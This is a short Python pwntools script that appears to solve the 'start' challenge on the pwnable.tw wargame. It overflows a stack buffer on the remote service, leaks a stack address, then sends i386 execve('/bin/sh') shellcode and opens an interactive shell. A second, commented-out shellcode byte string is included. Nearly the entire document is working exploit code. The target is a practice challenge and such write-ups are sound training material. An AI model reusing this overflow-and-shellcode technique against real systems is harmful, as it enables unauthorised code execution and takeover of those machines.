#!/usr/bin/python3
from pwn import *

context(arch='i386', os='linux')

r = remote('chall.pwnable.tw', 10000)
#r = process("start")


payload = b'a' * 0x14 + p32(0x8048087)

r.sendafter("CTF:", payload)

leak = u32(r.recv(4))
print(hex(leak))


payload = b'a' * 0x14 + p32(leak + 0x14)

# shellcode
# xor eax, eax : erase eax register
# mov ebx, esp : point to /bin/sh 
# mov al, 0xb  : system call to execve's opcode
shellcode = asm('''				
	xor eax, eax					
	push eax
	push %s
	push %s
	mov ebx, esp
	xor ecx, ecx
	xor edx, edx
	mov al, 0xb
	int 0x80
'''%(u32("/sh\0"), u32("/bin")))

# shellcode online:
# shellcode= b'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80\x00'		

payload += shellcode


r.send(payload)





r.interactive()





